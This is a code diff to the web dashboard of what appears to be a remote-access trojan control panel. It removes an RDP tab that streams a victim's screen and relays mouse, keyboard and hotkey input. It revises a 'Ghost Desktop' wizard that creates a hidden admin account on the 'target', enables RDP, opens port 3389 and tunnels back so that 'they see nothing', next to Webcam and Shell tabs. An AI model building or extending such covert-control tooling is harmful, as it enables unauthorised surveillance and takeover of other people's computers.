@@ -989,176 +989,6 @@ select{
 }
 .panel-card-title{font-size:11px;color:var(--text);margin-bottom:8px;font-weight:500;}
 
-/* ═══════════════════════════════════════
-   RDP TAB — full remote desktop
-═══════════════════════════════════════ */
-#tab-rdp{
-  display:none;flex-direction:column;
-  background:#0a0a0c;
-  position:relative;
-  overflow:hidden;
-}
-#tab-rdp.active{ display:flex; }
-
-/* Top HUD bar */
-.rdp-hud{
-  flex-shrink:0;
-  height:36px;
-  background:rgba(10,10,12,0.95);
-  border-bottom:1px solid rgba(255,255,255,0.06);
-  display:flex;align-items:center;gap:0;
-  padding:0 10px;
-  z-index:10;
-  backdrop-filter:blur(8px);
-}
-.rdp-hud-sep{ width:1px;height:18px;background:rgba(255,255,255,0.08);margin:0 6px; }
-.rdp-stat{
-  font-family:var(--mono);font-size:10px;
-  color:rgba(255,255,255,0.45);
-  letter-spacing:0.05em;
-  padding:0 8px;
-  white-space:nowrap;
-}
-.rdp-stat span{ color:rgba(255,255,255,0.85); }
-.rdp-btn{
-  font-family:var(--mono);font-size:10px;letter-spacing:0.06em;
-  padding:4px 10px;border:1px solid rgba(255,255,255,0.1);
-  border-radius:5px;background:rgba(255,255,255,0.05);
-  color:rgba(255,255,255,0.6);cursor:pointer;
-  transition:all 0.12s;white-space:nowrap;
-}
-.rdp-btn:hover{ background:rgba(255,255,255,0.1);color:#fff;border-color:rgba(255,255,255,0.2); }
-.rdp-btn.active{ background:rgba(59,130,246,0.25);color:#60a5fa;border-color:rgba(59,130,246,0.4); }
-.rdp-btn.danger{ border-color:rgba(248,113,113,0.3);color:#f87171; }
-.rdp-btn.danger:hover{ background:rgba(248,113,113,0.15); }
-.rdp-btn.green-btn{ border-color:rgba(34,197,94,0.3);color:#4ade80; }
-.rdp-btn.green-btn:hover{ background:rgba(34,197,94,0.15); }
-.rdp-hud-right{ margin-left:auto;display:flex;align-items:center;gap:6px; }
-
-/* Hotkey palette */
-.rdp-hotkeys{
-  flex-shrink:0;
-  background:rgba(5,5,8,0.98);
-  border-bottom:1px solid rgba(255,255,255,0.05);
-  padding:5px 10px;
-  display:flex;gap:5px;flex-wrap:wrap;align-items:center;
-}
-.rdp-hk{
-  font-family:var(--mono);font-size:9px;letter-spacing:0.05em;
-  padding:3px 8px;border:1px solid rgba(255,255,255,0.08);
-  border-radius:4px;background:rgba(255,255,255,0.03);
-  color:rgba(255,255,255,0.5);cursor:pointer;
-  transition:all 0.1s;
-}
-.rdp-hk:hover{ background:rgba(59,130,246,0.2);color:#93c5fd;border-color:rgba(59,130,246,0.35); }
-.rdp-hk-label{ font-size:9px;color:rgba(255,255,255,0.2);letter-spacing:0.08em;text-transform:uppercase;margin-right:4px; }
-
-/* Canvas viewport */
-.rdp-viewport{
-  flex:1;min-height:0;
-  position:relative;
-  overflow:auto;
-  display:flex;align-items:center;justify-content:center;
-  background:#050508;
-  cursor:none;
-}
-.rdp-viewport::-webkit-scrollbar{ width:4px;height:4px; }
-.rdp-viewport::-webkit-scrollbar-thumb{ background:rgba(255,255,255,0.1);border-radius:6px; }
-.rdp-viewport::-webkit-scrollbar-track{ background:transparent; }
-
-#rdp-canvas{
-  display:block;
-  image-rendering:auto;
-  /* fills the viewport entirely in fit mode */
-  width:100%;
-  height:100%;
-  object-fit:contain;
-}
-#rdp-canvas.pixelated{
-  image-rendering:pixelated;
-  width:auto;height:auto;
-}
-
-/* Cursor overlay drawn in canvas — the fake cursor */
-#rdp-cursor{
-  position:absolute;
-  width:16px;height:16px;
-  pointer-events:none;
-  z-index:20;
-  transform:translate(-2px,-2px);
-  display:none;
-}
-#rdp-cursor svg{ width:100%;height:100%; }
-
-/* Connection overlay */
-.rdp-overlay{
-  position:absolute;inset:0;
-  display:flex;flex-direction:column;
-  align-items:center;justify-content:center;
-  gap:16px;
-  background:rgba(10,10,12,0.92);
-  z-index:30;
-}
-.rdp-overlay-icon{ font-size:40px;opacity:0.5; }
-.rdp-overlay-title{
-  font-family:var(--mono);font-size:14px;
-  color:rgba(255,255,255,0.6);letter-spacing:0.1em;
-}
-.rdp-overlay-sub{ font-size:11px;color:rgba(255,255,255,0.3); }
-.rdp-connecting-ring{
-  width:48px;height:48px;
-  border:2px solid rgba(59,130,246,0.2);
-  border-top-color:#3b82f6;
-  border-radius:50%;
-  animation:rdp-spin 1s linear infinite;
-}
-@keyframes rdp-spin{ to{ transform:rotate(360deg); } }
-
-/* Status bar */
-.rdp-statusbar{
-  flex-shrink:0;
-  height:22px;
-  background:rgba(5,5,8,0.98);
-  border-top:1px solid rgba(255,255,255,0.05);
-  display:flex;align-items:center;gap:10px;
-  padding:0 12px;
-}
-.rdp-sb-item{
-  font-family:var(--mono);font-size:9px;
-  color:rgba(255,255,255,0.3);letter-spacing:0.05em;
-}
-.rdp-sb-item span{ color:rgba(255,255,255,0.65); }
-.rdp-sb-dot{
-  width:5px;height:5px;border-radius:50%;
-  background:#ef4444;flex-shrink:0;
-}
-.rdp-sb-dot.live{ background:#22c55e;animation:live-pulse 2s infinite; }
-
-/* Fullscreen mode */
-.rdp-fullscreen-wrap{
-  position:fixed;inset:0;z-index:99999;
-  background:#000;
-  display:flex;flex-direction:column;
-}
-.rdp-fullscreen-wrap .rdp-hud{ background:rgba(0,0,0,0.9); }
-.rdp-fullscreen-wrap .rdp-viewport{ flex:1;min-height:0; }
-
-/* Quality selector */
-.rdp-quality-wrap{
-  display:flex;align-items:center;gap:5px;
-}
-.rdp-quality-wrap label{
-  font-family:var(--mono);font-size:9px;color:rgba(255,255,255,0.4);letter-spacing:0.06em;
-}
-.rdp-quality-wrap select{
-  background:rgba(255,255,255,0.05);
-  border:1px solid rgba(255,255,255,0.1);
-  border-radius:4px;
-  padding:2px 6px;
-  color:rgba(255,255,255,0.7);
-  font-family:var(--mono);font-size:10px;
-  outline:none;
-}
 /* ── Ghost Desktop tab ── */
 #tab-ghost{background:#07080d;}
 #tab-ghost.active{display:flex;flex-direction:column;}
@@ -1364,7 +1194,6 @@ select{
     </div>
     <div class="modal-tabs">
       <button class="tab-btn active" data-tab="screen">Screen</button>
-      <button class="tab-btn" data-tab="rdp" style="color:#60a5fa;font-weight:600;">🖥 RDP</button>
       <button class="tab-btn" data-tab="ghost" style="color:#a78bfa;font-weight:600;">👻 Ghost Desktop</button>
       <button class="tab-btn" data-tab="webcam">Webcam</button>
       <button class="tab-btn" data-tab="shell">Shell</button>
@@ -1426,119 +1255,13 @@ select{
 
       </div>
 
-      <!-- ═══════════════════════════════════════════
-           RDP — Full Remote Desktop
-      ═══════════════════════════════════════════ -->
-      <div class="tab-content" id="tab-rdp">
-
-        <!-- HUD toolbar -->
-        <div class="rdp-hud" id="rdp-hud">
-          <!-- Stream controls -->
-          <button class="rdp-btn green-btn" id="rdp-btn-connect" onclick="rdpConnect()">▶ Connect</button>
-          <button class="rdp-btn danger" id="rdp-btn-disconnect" onclick="rdpDisconnect()" style="display:none;">■ Disconnect</button>
-          <div class="rdp-hud-sep"></div>
-
-          <!-- Input toggle -->
-          <button class="rdp-btn" id="rdp-btn-ctrl" onclick="rdpToggleCtrl()" title="Toggle mouse & keyboard input">🖱 Input OFF</button>
-          <div class="rdp-hud-sep"></div>
-
-          <!-- View mode -->
-          <button class="rdp-btn" id="rdp-btn-fit" onclick="rdpToggleFit()" title="Fit to window / native resolution">⊡ Fit</button>
-          <button class="rdp-btn" id="rdp-btn-fs" onclick="rdpToggleFullscreen()" title="Fullscreen">⛶ Full</button>
-          <div class="rdp-hud-sep"></div>
-
-          <!-- Quality -->
-          <div class="rdp-quality-wrap">
-            <label>QUALITY</label>
-            <select id="rdp-quality" onchange="rdpSetQuality(this.value)">
-              <option value="high">High (40fps)</option>
-              <option value="med" selected>Medium (20fps)</option>
-              <option value="low">Low (10fps)</option>
-            </select>
-          </div>
-          <div class="rdp-hud-sep"></div>
-
-          <!-- Stats -->
-          <div class="rdp-stat" id="rdp-stat-fps">FPS <span>—</span></div>
-          <div class="rdp-stat" id="rdp-stat-lat">LAT <span>—</span></div>
-          <div class="rdp-stat" id="rdp-stat-res">RES <span>—</span></div>
-
-          <!-- Right side -->
-          <div class="rdp-hud-right">
-            <button class="rdp-btn" onclick="rdpTakeSnap()" title="Save screenshot">📷</button>
-            <button class="rdp-btn danger" onclick="rdpSendCtrlAltDel()" title="Send Ctrl+Alt+Del">⌨ C+A+D</button>
-          </div>
-        </div>
-
-        <!-- Hotkey palette -->
-        <div class="rdp-hotkeys" id="rdp-hotkeys">
-          <span class="rdp-hk-label">HOTKEYS</span>
-          <button class="rdp-hk" onclick="rdpHotkey(['ctrl','c'])">Ctrl+C</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['ctrl','v'])">Ctrl+V</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['ctrl','x'])">Ctrl+X</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['ctrl','z'])">Ctrl+Z</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['ctrl','a'])">Ctrl+A</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['ctrl','s'])">Ctrl+S</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['ctrl','w'])">Ctrl+W</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['ctrl','t'])">Ctrl+T</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['alt','F4'])">Alt+F4</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['alt','tab'])">Alt+Tab</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['winleft','d'])">Win+D</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['winleft','r'])">Win+R</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['winleft','e'])">Win+E</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['winleft','l'])">Win+L</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['ctrl','shift','escape'])">Task Mgr</button>
-          <button class="rdp-hk" onclick="rdpHotkey(['printscreen'])">PrtScr</button>
-          <button class="rdp-hk" onclick="rdpSendText()" title="Type a string of text">⌨ Type Text…</button>
-        </div>
-
-        <!-- Canvas viewport -->
-        <div class="rdp-viewport" id="rdp-viewport"
-          onmousemove="rdpOnMouseMove(event)"
-          onmousedown="rdpOnMouseDown(event)"
-          onmouseup="rdpOnMouseUp(event)"
-          ondblclick="rdpOnDblClick(event)"
-          oncontextmenu="rdpOnContextMenu(event)"
-          onwheel="rdpOnWheel(event)"
-          onmouseleave="rdpOnMouseLeave()"
-          onmouseenter="rdpOnMouseEnter()">
-
-          <canvas id="rdp-canvas"></canvas>
-
-          <!-- Custom cursor -->
-          <div id="rdp-cursor">
-            <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M2 2L2 12L5.5 9L7.5 14L9 13.5L7 8.5L11 8.5L2 2Z" fill="white" stroke="#222" stroke-width="0.8"/>
-            </svg>
-          </div>
-
-          <!-- Overlay shown when not connected -->
-          <div class="rdp-overlay" id="rdp-overlay">
-            <div class="rdp-overlay-icon">🖥</div>
-            <div class="rdp-overlay-title">REMOTE DESKTOP</div>
-            <div class="rdp-overlay-sub">Click CONNECT to start a session</div>
-          </div>
-        </div>
-
-        <!-- Status bar -->
-        <div class="rdp-statusbar">
-          <div class="rdp-sb-dot" id="rdp-sb-dot"></div>
-          <div class="rdp-sb-item" id="rdp-sb-status">DISCONNECTED</div>
-          <div class="rdp-sb-item" style="margin-left:auto;" id="rdp-sb-node">No node selected</div>
-        </div>
-
-      </div>
-
-      <!-- ═══════════════════════════════════════════
-           GHOST DESKTOP — Hidden RDP Session
-      ═══════════════════════════════════════════ -->
+      <!-- GHOST DESKTOP -->
       <div class="tab-content" id="tab-ghost">
 
-        <!-- HUD -->
         <div class="ghost-hud">
           <button class="ghost-btn active" id="ghost-btn-setup" onclick="ghostShowSetup()">⚙ Setup</button>
           <div class="ghost-hud-sep"></div>
-          <button class="ghost-btn" id="ghost-btn-launch" onclick="ghostLaunch()" style="display:none;">▶ Launch Session</button>
+          <button class="ghost-btn" id="ghost-btn-launch" onclick="ghostConnect()" style="display:none;">▶ Launch Session</button>
           <button class="ghost-btn danger" id="ghost-btn-kill" onclick="ghostKill()" style="display:none;">■ Kill Session</button>
           <div class="ghost-hud-sep"></div>
           <div class="ghost-stat" id="ghost-stat-status">STATUS <span>IDLE</span></div>
@@ -1549,15 +1272,14 @@ select{
           </div>
         </div>
 
-        <!-- Setup wizard panel -->
+        <!-- Setup wizard -->
         <div class="ghost-setup" id="ghost-setup-panel">
 
           <div style="font-family:var(--mono);font-size:11px;color:rgba(255,255,255,0.4);line-height:1.8;padding:4px 0 8px;">
             Creates a <b style="color:rgba(255,255,255,0.7);">hidden second Windows session</b> on the target using a ghost admin account.
-            Their current session is untouched — they see nothing. You get full desktop control via RDP.
+            Their current session is untouched — they see nothing. You get a full interactive desktop via RDP.
           </div>
 
-          <!-- Step 1: Provision -->
           <div class="ghost-step" id="ghost-step-1">
             <div class="ghost-step-head">
               <div class="ghost-step-num" id="ghost-s1-num">1</div>
@@ -1566,7 +1288,7 @@ select{
             <div class="ghost-step-body" id="ghost-s1-body">
               Creates a hidden admin account with a random name/password, enables Windows RDP service, and opens firewall port 3389.
             </div>
-            <div style="padding-left:32px;margin-top:4px;">
+            <div style="padding-left:32px;margin-top:8px;">
               <button class="ghost-btn active" onclick="ghostProvision()">⚡ Run Provision</button>
             </div>
             <div class="ghost-creds" id="ghost-creds" style="display:none;">
@@ -1575,47 +1297,44 @@ select{
             </div>
           </div>
 
-          <!-- Step 2: Tunnel -->
           <div class="ghost-step" id="ghost-step-2">
             <div class="ghost-step-head">
               <div class="ghost-step-num" id="ghost-s2-num">2</div>
-              OPEN REVERSE RDP TUNNEL
+              OPEN REVERSE TUNNEL
             </div>
             <div class="ghost-step-body" id="ghost-s2-body">
-              Agent opens a reverse WebSocket tunnel through this server so your browser can reach their RDP port directly — no port-forwarding needed on their end.
+              Agent opens a reverse tunnel through this server so your browser can reach their RDP port — no port-forwarding needed on their end.
             </div>
-            <div style="padding-left:32px;margin-top:4px;">
+            <div style="padding-left:32px;margin-top:8px;">
               <button class="ghost-btn" id="ghost-tunnel-btn" onclick="ghostOpenTunnel()" disabled>🔗 Open Tunnel</button>
             </div>
             <div id="ghost-tunnel-status" style="padding-left:32px;font-family:var(--mono);font-size:10px;color:rgba(255,255,255,0.35);margin-top:6px;"></div>
           </div>
 
-          <!-- Step 3: Connect viewer -->
           <div class="ghost-step" id="ghost-step-3">
             <div class="ghost-step-head">
               <div class="ghost-step-num" id="ghost-s3-num">3</div>
               CONNECT VIEWER
             </div>
             <div class="ghost-step-body" id="ghost-s3-body">
-              Opens the embedded RDP viewer inside this panel. You get a full interactive desktop — mouse, keyboard, clipboard, everything.
+              Downloads a pre-configured .rdp file — double-click it and Windows Remote Desktop connects directly into the hidden ghost session.
             </div>
-            <div style="padding-left:32px;margin-top:4px;">
+            <div style="padding-left:32px;margin-top:8px;">
               <button class="ghost-btn" id="ghost-viewer-btn" onclick="ghostConnect()" disabled>🖥 Open Desktop</button>
             </div>
           </div>
 
         </div>
 
-        <!-- Viewer (hidden until connected) -->
+        <!-- Viewer panel (active after step 3) -->
         <div class="ghost-viewer" id="ghost-viewer-panel">
           <div class="ghost-viewer-overlay" id="ghost-viewer-overlay">
             <div class="rdp-connecting-ring"></div>
-            <div style="font-family:var(--mono);font-size:12px;color:rgba(255,255,255,0.5);">Connecting to ghost session…</div>
+            <div style="font-family:var(--mono);font-size:12px;color:rgba(255,255,255,0.5);margin-top:12px;">Loading session info…</div>
           </div>
-          <iframe id="ghost-iframe" src="" allow="clipboard-read; clipboard-write" sandbox="allow-same-origin allow-scripts allow-forms allow-popups"></iframe>
+          <iframe id="ghost-iframe" src="" allow="clipboard-read; clipboard-write"></iframe>
         </div>
 
-        <!-- Status bar -->
         <div class="ghost-sb">
           <div class="ghost-sb-dot" id="ghost-sb-dot"></div>
           <div class="ghost-sb-item" id="ghost-sb-text">GHOST SESSION — IDLE</div>
@@ -3040,374 +2759,6 @@ async function uploadFileToAgent(){
 }
 
 // ══════════════════════════════════════════════════════
-//  RDP — Full Remote Desktop Engine
-// ══════════════════════════════════════════════════════
-const rdp = {
-  streaming: false,
-  ctrlEnabled: false,
-  fitMode: true,
-  fullscreen: false,
-  frameCount: 0,
-  lastFpsTime: 0,
-  fps: 0,
-  latency: 0,
-  lastFrameTs: 0,
-  nativeW: 0,
-  nativeH: 0,
-  quality: 'med',
-  pressedKeys: new Set(),
-  // quality presets: [fps, jpeg quality, scale]
-  presets: {
-    high: { fps: 40, q: 65, scale: 0.7  },
-    med:  { fps: 20, q: 45, scale: 0.6  },
-    low:  { fps: 10, q: 30, scale: 0.45 },
-  },
-};
-
-// ── Socket handler for RDP frames ──
-socket.on('screen_frame', data => {
-  // feed the old Screen tab too
-  if(selectedClient && data.client_id === selectedClient.id && streaming){
-    const img = document.getElementById('screen-img');
-    img.src = 'data:image/jpeg;base64,'+data.frame;
-    img.style.display = 'block';
-    document.getElementById('stream-placeholder').style.display = 'none';
-    document.getElementById('stream-status').textContent = new Date().toTimeString().slice(0,8);
-  }
-  // RDP canvas
-  if(!rdp.streaming || !selectedClient || data.client_id !== selectedClient.id) return;
-  const now = performance.now();
-  rdp.latency = Math.round(now - rdp.lastFrameTs);
-  rdp.lastFrameTs = now;
-  rdp.frameCount++;
-  if(now - rdp.lastFpsTime >= 1000){
-    rdp.fps = rdp.frameCount;
-    rdp.frameCount = 0;
-    rdp.lastFpsTime = now;
-    rdpUpdateStats();
-  }
-  const canvas = document.getElementById('rdp-canvas');
-  if(!canvas) return;
-  const img = new Image();
-  img.onload = () => {
-    rdp.nativeW = img.naturalWidth;
-    rdp.nativeH = img.naturalHeight;
-    const ctx = canvas.getContext('2d');
-    if(rdp.fitMode){
-      const vp = document.getElementById('rdp-viewport');
-      const vw = vp.clientWidth - 2, vh = vp.clientHeight - 2;
-      const scale = Math.min(vw/img.naturalWidth, vh/img.naturalHeight);
-      const dw = Math.floor(img.naturalWidth * scale);
-      const dh = Math.floor(img.naturalHeight * scale);
-      if(canvas.width !== dw || canvas.height !== dh){ canvas.width=dw; canvas.height=dh; }
-    } else {
-      if(canvas.width !== img.naturalWidth || canvas.height !== img.naturalHeight){
-        canvas.width  = img.naturalWidth;
-        canvas.height = img.naturalHeight;
-      }
-    }
-    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-    document.getElementById('rdp-stat-res').querySelector('span').textContent =
-      img.naturalWidth+'×'+img.naturalHeight;
-  };
-  img.src = 'data:image/jpeg;base64,'+data.frame;
-});
-
-function rdpUpdateStats(){
-  const fps = document.getElementById('rdp-stat-fps');
-  const lat = document.getElementById('rdp-stat-lat');
-  if(fps) fps.querySelector('span').textContent = rdp.fps;
-  if(lat) lat.querySelector('span').textContent = rdp.latency+'ms';
-}
-
-// ── Connect / Disconnect ──
-function rdpConnect(){
-  if(!selectedClient){ showToast('Select a node first'); return; }
-  const preset = rdp.presets[rdp.quality];
-  rdp.streaming = true;
-  rdp.frameCount = 0;
-  rdp.lastFpsTime = performance.now();
-  rdp.lastFrameTs = performance.now();
-
-  // Tell server to start streaming with chosen quality
-  socket.emit('start_stream', {
-    client_id: selectedClient.id,
-    fps: preset.fps,
-    quality: preset.q,
-    scale: preset.scale,
-  });
-
-  // UI
-  document.getElementById('rdp-btn-connect').style.display = 'none';
-  document.getElementById('rdp-btn-disconnect').style.display = '';
-  document.getElementById('rdp-overlay').style.display = 'none';
-  document.getElementById('rdp-sb-dot').classList.add('live');
-  document.getElementById('rdp-sb-status').textContent = 'CONNECTED — '+selectedClient.hostname;
-  document.getElementById('rdp-sb-node').textContent = selectedClient.ip+' · '+selectedClient.platform;
-  addLog('RDP session started: '+selectedClient.hostname, 'connect');
-}
-
-function rdpDisconnect(){
-  if(!rdp.streaming) return;
-  rdp.streaming = false;
-  if(selectedClient) socket.emit('stop_stream', {client_id: selectedClient.id});
-  rdpResetUI();
-  addLog('RDP session ended', 'info');
-}
-
-function rdpResetUI(){
-  document.getElementById('rdp-btn-connect').style.display = '';
-  document.getElementById('rdp-btn-disconnect').style.display = 'none';
-  document.getElementById('rdp-overlay').style.display = 'flex';
-  document.getElementById('rdp-overlay').innerHTML = `
-    <div class="rdp-overlay-icon">🖥</div>
-    <div class="rdp-overlay-title">SESSION ENDED</div>
-    <div class="rdp-overlay-sub">Click CONNECT to start a new session</div>`;
-  document.getElementById('rdp-sb-dot').classList.remove('live');
-  document.getElementById('rdp-sb-status').textContent = 'DISCONNECTED';
-  document.getElementById('rdp-stat-fps').querySelector('span').textContent = '—';
-  document.getElementById('rdp-stat-lat').querySelector('span').textContent = '—';
-  document.getElementById('rdp-stat-res').querySelector('span').textContent = '—';
-  if(rdp.ctrlEnabled) rdpToggleCtrl(); // disable ctrl too
-}
-
-// ── Input toggle ──
-function rdpToggleCtrl(){
-  rdp.ctrlEnabled = !rdp.ctrlEnabled;
-  const btn = document.getElementById('rdp-btn-ctrl');
-  const vp  = document.getElementById('rdp-viewport');
-  if(rdp.ctrlEnabled){
-    btn.textContent = '🖱 Input ON';
-    btn.classList.add('active');
-    vp.style.cursor = 'none';
-    vp.focus();
-  } else {
-    btn.textContent = '🖱 Input OFF';
-    btn.classList.remove('active');
-    vp.style.cursor = 'default';
-  }
-}
-
-// ── Fit / native toggle ──
-function rdpToggleFit(){
-  rdp.fitMode = !rdp.fitMode;
-  const btn = document.getElementById('rdp-btn-fit');
-  btn.textContent = rdp.fitMode ? '⊡ Fit' : '⊞ Native';
-  btn.classList.toggle('active', !rdp.fitMode);
-  const canvas = document.getElementById('rdp-canvas');
-  canvas.classList.toggle('pixelated', !rdp.fitMode);
-}
-
-// ── Quality change ──
-function rdpSetQuality(val){
-  rdp.quality = val;
-  if(rdp.streaming){
-    // restart stream with new settings
-    rdpDisconnect();
-    setTimeout(rdpConnect, 300);
-  }
-}
-
-// ── Fullscreen ──
-function rdpToggleFullscreen(){
-  const modal = document.getElementById('modal-overlay');
-  const rdpTab = document.getElementById('tab-rdp');
-  if(!rdp.fullscreen){
-    // Move RDP tab into a fixed fullscreen wrapper
-    let wrap = document.getElementById('rdp-fs-wrap');
-    if(!wrap){
-      wrap = document.createElement('div');
-      wrap.id = 'rdp-fs-wrap';
-      wrap.className = 'rdp-fullscreen-wrap';
-      document.body.appendChild(wrap);
-    }
-    wrap.appendChild(rdpTab);
-    wrap.style.display = 'flex';
-    rdp.fullscreen = true;
-    document.getElementById('rdp-btn-fs').textContent = '✕ Exit Full';
-    document.getElementById('rdp-btn-fs').classList.add('active');
-    // ESC to exit
-    wrap._escHandler = e => { if(e.key==='Escape'){ e.stopPropagation(); rdpToggleFullscreen(); } };
-    wrap.addEventListener('keydown', wrap._escHandler, true);
-    wrap.focus();
-  } else {
-    const wrap = document.getElementById('rdp-fs-wrap');
-    // Return rdpTab to modal body
-    const modalBody = document.querySelector('.modal-body');
-    // Insert after screen tab
-    const screenTab = document.getElementById('tab-screen');
-    screenTab.after(rdpTab);
-    wrap.style.display = 'none';
-    rdp.fullscreen = false;
-    document.getElementById('rdp-btn-fs').textContent = '⛶ Full';
-    document.getElementById('rdp-btn-fs').classList.remove('active');
-  }
-}
-document.addEventListener('keydown', e => {
-  if(e.key === 'Escape' && rdp.fullscreen){ rdpToggleFullscreen(); }
-});
-
-// ── Mouse coordinate helper ──
-function rdpGetXY(e){
-  const canvas = document.getElementById('rdp-canvas');
-  if(!canvas || !rdp.nativeW) return null;
-  const rect = canvas.getBoundingClientRect();
-  const cx = e.clientX - rect.left;
-  const cy = e.clientY - rect.top;
-  // Map canvas pixels → native screen pixels
-  const x = Math.round(cx * (rdp.nativeW / canvas.width));
-  const y = Math.round(cy * (rdp.nativeH / canvas.height));
-  return { x, y, iw: canvas.width, ih: canvas.height };
-}
-
-// ── Mouse events ──
-function rdpOnMouseMove(e){
-  // Move the fake cursor
-  const cursor = document.getElementById('rdp-cursor');
-  const vp = document.getElementById('rdp-viewport');
-  const vpRect = vp.getBoundingClientRect();
-  cursor.style.left = (e.clientX - vpRect.left) + 'px';
-  cursor.style.top  = (e.clientY - vpRect.top)  + 'px';
-
-  if(!rdp.ctrlEnabled || !rdp.streaming || !selectedClient) return;
-  const xy = rdpGetXY(e);
-  if(!xy) return;
-  socket.volatile.emit('mouse_move', {client_id: selectedClient.id, ...xy});
-}
-
-function rdpOnMouseDown(e){
-  if(!rdp.ctrlEnabled || !rdp.streaming || !selectedClient) return;
-  if(e.button === 1) e.preventDefault(); // prevent middle-click scroll
-  const xy = rdpGetXY(e);
-  if(!xy) return;
-  const btn = e.button === 2 ? 'right' : e.button === 1 ? 'middle' : 'left';
-  socket.emit('mouse_down', {client_id: selectedClient.id, ...xy, button: btn});
-}
-
-function rdpOnMouseUp(e){
-  if(!rdp.ctrlEnabled || !rdp.streaming || !selectedClient) return;
-  const xy = rdpGetXY(e);
-  if(!xy) return;
-  const btn = e.button === 2 ? 'right' : e.button === 1 ? 'middle' : 'left';
-  socket.emit('mouse_up', {client_id: selectedClient.id, ...xy, button: btn});
-}
-
-function rdpOnDblClick(e){
-  if(!rdp.ctrlEnabled || !rdp.streaming || !selectedClient) return;
-  const xy = rdpGetXY(e);
-  if(!xy) return;
-  socket.emit('mouse_dblclick', {client_id: selectedClient.id, ...xy});
-}
-
-function rdpOnContextMenu(e){
-  e.preventDefault();
-  if(!rdp.ctrlEnabled || !rdp.streaming || !selectedClient) return;
-  const xy = rdpGetXY(e);
-  if(!xy) return;
-  socket.emit('mouse_click', {client_id: selectedClient.id, ...xy, button: 'right'});
-}
-
-function rdpOnWheel(e){
-  e.preventDefault();
-  if(!rdp.ctrlEnabled || !rdp.streaming || !selectedClient) return;
-  const xy = rdpGetXY(e);
-  if(!xy) return;
-  socket.emit('mouse_scroll', {
-    client_id: selectedClient.id, ...xy,
-    dx: Math.round(e.deltaX),
-    dy: Math.round(e.deltaY),
-  });
-}
-
-function rdpOnMouseEnter(){
-  const cursor = document.getElementById('rdp-cursor');
-  if(rdp.ctrlEnabled) cursor.style.display = 'block';
-}
-function rdpOnMouseLeave(){
-  document.getElementById('rdp-cursor').style.display = 'none';
-}
-
-// ── Keyboard ──
-document.addEventListener('keydown', e => {
-  // Only capture when RDP tab is active and input is on
-  const rdpTab = document.getElementById('tab-rdp');
-  if(!rdpTab || !rdpTab.classList.contains('active')) return;
-  if(!rdp.ctrlEnabled || !rdp.streaming || !selectedClient) return;
-  // Don't capture if user is typing in an input
-  const tag = document.activeElement.tagName;
-  if(tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return;
-
-  e.preventDefault();
-  e.stopPropagation();
-
-  rdp.pressedKeys.add(e.key);
-  socket.emit('rdp_key_down', {
-    client_id: selectedClient.id,
-    key: e.key,
-    code: e.code,
-    ctrl: e.ctrlKey,
-    alt: e.altKey,
-    shift: e.shiftKey,
-    meta: e.metaKey,
-  });
-});
-
-document.addEventListener('keyup', e => {
-  const rdpTab = document.getElementById('tab-rdp');
-  if(!rdpTab || !rdpTab.classList.contains('active')) return;
-  if(!rdp.ctrlEnabled || !rdp.streaming || !selectedClient) return;
-  const tag = document.activeElement.tagName;
-  if(tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return;
-
-  e.preventDefault();
-  rdp.pressedKeys.delete(e.key);
-  socket.emit('rdp_key_up', {
-    client_id: selectedClient.id,
-    key: e.key,
-    code: e.code,
-  });
-});
-
-// ── Hotkeys ──
-function rdpHotkey(keys){
-  if(!selectedClient){ showToast('No node selected'); return; }
-  socket.emit('rdp_hotkey', {client_id: selectedClient.id, keys});
-}
-
-function rdpSendCtrlAltDel(){
-  if(!selectedClient){ showToast('No node selected'); return; }
-  socket.emit('rdp_hotkey', {client_id: selectedClient.id, keys: ['ctrl','alt','delete']});
-  addLog('Sent Ctrl+Alt+Del to '+selectedClient.hostname, 'info');
-}
-
-function rdpSendText(){
-  if(!selectedClient){ showToast('No node selected'); return; }
-  const text = prompt('Text to type on remote machine:');
-  if(text == null || text === '') return;
-  socket.emit('rdp_type', {client_id: selectedClient.id, text});
-  addLog('Typed text on '+selectedClient.hostname, 'info');
-}
-
-// ── Screenshot from RDP canvas ──
-function rdpTakeSnap(){
-  const canvas = document.getElementById('rdp-canvas');
-  if(!canvas || !rdp.streaming){ addLog('No active RDP frame to capture','error'); return; }
-  const url = canvas.toDataURL('image/png');
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = 'rdp_snap_'+(selectedClient?selectedClient.hostname:'unknown')+'_'+Date.now()+'.png';
-  a.click();
-  addLog('RDP snapshot saved', 'info');
-}
-
-// Stop RDP if modal closes
-const _origCloseModal = closeModal;
-closeModal = function(){
-  if(rdp.streaming) rdpDisconnect();
-  _origCloseModal();
-};
-
-// ══════════════════════════════════════════════════════
 //  GHOST DESKTOP — Hidden RDP Session Engine
 // ══════════════════════════════════════════════════════
 const ghost = {
@@ -3531,7 +2882,7 @@ function ghostConnect(){
   const port = ghost.tunnelPort || 13389;
   const wsBase = location.origin.replace(/^http/, 'ws');
   // The iframe loads a self-contained guacamole-lite / noVNC page served by our server
-  const viewerUrl = `/ghost_viewer?cid=${selectedClient.id}&user=${encodeURIComponent(ghost.creds.user)}&pass=${encodeURIComponent(ghost.creds.pass)}&port=${port}`;
+  const viewerUrl = `/ghost_viewer?cid=${selectedClient.id}&user=${encodeURIComponent(ghost.creds.user)}&pass=${encodeURIComponent(ghost.creds.pass)}&port=${port}&token=${encodeURIComponent(_dashboardToken)}`;
   const iframe = document.getElementById('ghost-iframe');
   iframe.src = viewerUrl;
   iframe.onload = () => {
